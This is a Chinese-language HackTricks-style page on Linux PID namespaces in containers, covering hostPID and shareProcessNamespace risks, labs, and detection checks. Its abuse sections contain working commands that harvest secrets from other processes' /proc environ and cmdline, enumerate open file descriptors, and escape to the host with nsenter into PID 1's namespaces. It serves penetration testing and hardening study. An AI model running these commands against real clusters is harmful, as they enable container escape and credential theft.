# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 概述

PID namespace 控制进程的编号方式以及哪些进程可见。这就是为什么容器可以拥有自己的 PID 1，尽管它并不是一台真正的机器。在 namespace 内部，workload 看到的是一个看起来属于本地的进程树。在 namespace 外部，主机仍然可以看到真实的主机 PID 以及完整的进程视图。<sup>[[3]](#references)</sup>

从安全角度来看，PID namespace 很重要，因为进程可见性具有很高的价值。一旦 workload 能够看到主机进程，它可能就能观察服务名称、命令行参数、通过进程参数传递的 secrets、通过 `/proc` 暴露的环境派生状态，以及潜在的 namespace-entry 目标。如果它不仅能查看这些进程，例如在满足适当条件时还能向其发送信号或使用 ptrace，问题就会严重得多。

## 操作

新的 PID namespace 会从自身的内部进程编号开始。namespace 内创建的第一个进程，从该 namespace 的角度来看会成为 PID 1，这也意味着它会针对孤儿子进程和信号行为获得特殊的 init-like 语义。这解释了许多容器中与 init 进程、僵尸进程回收相关的异常现象，也解释了为什么容器中有时会使用小型 init wrapper。<sup>[[3]](#references)</sup>

PID namespaces 构成一个层级结构。祖先 namespace 中的进程可以使用该祖先 namespace 分配的 PID 定位后代进程，但后代进程无法通过普通的基于 PID 的系统调用访问仅存在于祖先 namespace 中的任务，也无法通过 `setns()` 向上加入祖先 PID namespace。由祖先拥有、且被有意暴露给后代的 procfs 仍然可能 leak 祖先的进程视图。此外，使用 `setns()` 加入 PID namespace 会改变 **未来子进程** 所处的 namespace，而不会改变调用者自身；因此工具会在加入后 fork。procfs 挂载会保留执行挂载操作的进程所对应的 PID 视图，这就是为什么在 `unshare(CLONE_NEWPID)` 后创建新的 procfs 具有安全意义，而不仅仅是外观上的变化。<sup>[[3]](#references)</sup>

重要的安全经验是：进程可能因为只能看到自己的 PID 树而看似处于隔离状态，但这种隔离可以被有意移除。Docker 通过 `--pid=host` 提供此功能，而 Kubernetes 则通过 `hostPID: true` 实现。一旦容器加入主机 PID namespace，workload 就能直接看到主机进程，许多后续 attack path 也会变得更加现实。

## 实验

手动创建 PID namespace：
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
此时，shell 看到的是一个私有的进程视图。`--mount-proc` flag 很重要，因为它会挂载一个与新 PID namespace 匹配的 procfs 实例，使进程列表从内部看起来保持一致。<sup>[[3]](#references)</sup>

为了比较容器行为：
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
这种差异是即时且易于理解的，因此这是面向读者的一个很好的第一个 lab。

## Runtime Usage

Docker、Podman、containerd 和 CRI-O 中的普通容器会获得各自的 PID namespace。Kubernetes 容器通常具有独立的 PID 视图；`shareProcessNamespace: true` 会有意创建一个 Pod-wide 视图。<sup>[[4]](#references)</sup> 相比之下，`hostPID: true` 会选择节点的 PID namespace。LXC/Incus 环境依赖相同的 kernel primitive，不过 system-container 使用场景可能会暴露更复杂的进程树，并促使人们采用更多 debugging shortcuts。

相同的规则适用于任何地方：如果 runtime 选择不隔离 PID namespace，那就是对 container boundary 的有意削弱。

## Misconfigurations

最典型的 misconfiguration 是共享 host PID。团队通常会以 debugging、monitoring 或 service-management 便利性为理由，但这始终应被视为一个具有实际意义的 security exception。即使容器无法立即对 host processes 使用 write primitive，仅仅具备可见性也可能暴露大量 system 信息。一旦加入 `CAP_SYS_PTRACE` 等 capabilities 或有用的 procfs 访问权限，风险就会显著扩大。

另一个错误是认为，由于 workload 默认无法 kill 或 ptrace host processes，因此共享 host PID 就是 harmless 的。这一结论忽略了 enumeration 的价值、namespace-entry targets 的可用性，以及 PID visibility 与其他被削弱的 controls 结合后产生的影响。

### Kubernetes Pod-wide process sharing

`shareProcessNamespace: true` 与 `hostPID` 不同：它暴露的是**同一 Pod 中其他 containers 的 processes**，而不是 node processes。被 compromise 的 sidecar 或 debug container 随后可以在 procfs access checks 允许的范围内枚举 sibling 的 command lines 和 environment data；在 credentials 允许时发送 signals；并通过 `/proc/<pid>/root` 遍历 sibling 的 filesystem。Kubernetes 明确警告，此时 command-line/environment secrets 和 container filesystems 仅由适用的 Unix permissions 提供保护。<sup>[[4]](#references)</sup>

Useful cluster-side review:
```bash
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
[.metadata.namespace,.metadata.name,
(.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```
从 Pod-wide PID namespace 中被攻陷的 container 出发，首先测试实际访问权限，而不要假设可见性等同于可读性：<sup>[[4]](#references)</sup>
```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```
## 滥用

如果共享了 host PID namespace，攻击者可能检查 host 进程、收集进程参数、识别有价值的服务、定位可供 `nsenter` 使用的候选 PID，或将进程可见性与和 ptrace 相关的权限结合起来，干扰 host 或相邻的 workload。在某些情况下，仅仅看到正确的长期运行进程，就足以重新规划后续攻击方案。

第一个实际步骤始终是确认 host 进程确实可见：
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
一旦 host PIDs 可见，进程参数和 namespace-entry 目标通常会成为最有用的信息来源：
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
如果 `nsenter` 可用且权限足够，请测试是否可以将可见的 host 进程用作 namespace bridge：
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
即使 entry 被阻止，host PID sharing 仍然很有价值，因为它会暴露 service layout、runtime components，以及可作为下一步攻击目标的候选 privileged processes。仅有 PID visibility **不会**授予发送 signal、进行 trace、读取敏感的 `/proc/<pid>` entries，或加入 target 的其他 namespaces 的权限；credentials、dumpability、target namespace 所属 user namespace 中的 capabilities、Yama/LSM policy，以及 seccomp 仍然十分重要。<sup>[[3]](#references)</sup> 有关 process-injection 示例，请参阅 [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)。

Host PID visibility 也会让 file-descriptor abuse 更加现实。如果某个 privileged host process 或相邻 workload 打开了敏感 file 或 socket，攻击者可能可以检查 `/proc/<pid>/fd/` 并访问底层 object，具体取决于 ptrace-style checks、ownership、procfs mount options、object type 以及 target service model。仅仅看到 FD symlink 并不意味着可以打开它，而 socket 也不能仅通过打开其 `/proc/<pid>/fd/N` symlink 来复制。有关独立的 `pidfd_getfd()` primitive 及其 authorization checks，请参阅 [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md)。<sup>[[3]](#references)</sup>
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
这些命令很有用，因为它们可以判断 `hidepid=1` 或 `hidepid=2` 是否正在减少跨进程可见性，以及诸如已打开的 secret 文件、日志或 Unix sockets 等明显有趣的 descriptors 是否完全可见。

### 完整示例：host PID + `nsenter`

当进程同时拥有足够的权限加入 host namespaces 时，共享 host PID 会直接导致 host escape：
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
如果命令执行成功，容器进程现在已在主机的 mount、UTS、network、IPC 和 PID namespaces 中执行。其影响是立即攻陷主机。

即使缺少 `nsenter`，只要挂载了主机文件系统，也可能通过主机上的二进制文件实现相同结果：
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### 最近的 Runtime 注意事项

一些与 PID namespace 相关的攻击并不是传统的 `hostPID: true` 配置错误，而是与容器设置期间如何应用 procfs 保护有关的 Runtime 实现漏洞。

#### `maskedPaths` 竞争条件导致访问 host procfs

在存在漏洞的 `runc` 版本中，能够控制容器镜像或 `runc exec` 工作负载的攻击者，可以通过将容器侧的 `/dev/null` 替换为指向敏感 procfs 路径（例如 `/proc/sys/kernel/core_pattern`）的 symlink，来争抢 masking 阶段的执行时机。如果竞争成功，masked-path bind mount 可能会挂载到错误的目标上，从而将 host-global procfs 控制项暴露给新容器。<sup>[[1]](#references)</sup>

有用的审查命令：
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
这很重要，因为最终影响可能与直接暴露 procfs 相同：可写的 `core_pattern` 或 `sysrq-trigger`，随后导致 host 代码执行或拒绝服务。专门的 [masked paths](../masked-paths.md) 和 [sensitive host mounts](../../sensitive-host-mounts.md) 页面介绍了一般的 procfs 攻击面，这里不再重复。

#### 使用 `insject` 进行 Namespace 注入

诸如 `insject` 的 Namespace 注入工具表明，PID-namespace 交互并不总是要求在创建进程之前预先进入目标 namespace。辅助程序可以稍后附加，使用 `setns()`，并在保留对目标 PID 空间可见性的同时执行：<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
这种技术主要适用于 advanced debugging、offensive tooling 和 post-exploitation workflows，这些场景要求在 workload 已经完成初始化后加入 namespace context。

### 相关 FD Abuse 模式

当 host PIDs 可见时，有两种模式值得明确指出。第一，特权进程可能会在 `execve()` 期间保持敏感文件描述符处于打开状态，因为该描述符没有标记为 `O_CLOEXEC`。第二，service 可能会通过 Unix sockets，使用 `SCM_RIGHTS` 传递文件描述符。在这两种情况下，关键对象不再是 pathname，而是已经打开的 handle；低权限进程可能会继承或接收该 handle。

这在 container work 中很重要，因为即使 container filesystem 无法直接访问该路径，这个 handle 仍可能指向 `docker.sock`、特权日志、host secret file 或其他高价值对象。

## 检查

这些命令用于判断该进程是否具有 private PID view，或者是否已经能够枚举范围大得多的 process landscape。
```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```
这里值得关注的是：<sup>[[3]](#references)</sup>

- 如果进程列表中包含明显的主机服务，则 host PID sharing 可能已经生效。
- 只看到一个很小的 container-local 进程树是正常基线；看到 `systemd`、`dockerd` 或无关的 daemon 则不是。
- `NSpid` 可以暴露嵌套 namespaces 之间的 PID 映射。最左侧的值相对于与 procfs mount 关联的 PID namespace，后面依次是逐级嵌套 namespaces 中的值。
- 单独执行 `readlink /proc/self/ns/pid` 无法证明存在 `hostPID`：隔离的 container 同样拥有有效的 PID-namespace inode。应将其与进程列表、procfs mount、runtime 配置，以及可用时从 host-side 获取的 namespace inode 结合进行判断。
- 一旦能够看到 host PIDs，即使是只读的进程信息也会成为有价值的 reconnaissance。

如果发现某个 container 使用了 host PID sharing，不要将其视为表面差异。这会显著改变该 workload 能够观察并可能影响的范围。



## References

- [1] [runc security advisory：由于 mount race conditions 导致通过“masked path”滥用实现 container escape（CVE-2025-31133）](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool Release – insject：Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Linux man-pages 6.19 book](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [在 Pod 中的 Containers 之间共享 Process Namespace](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
{{#include ../../../../../banners/hacktricks-training.md}}
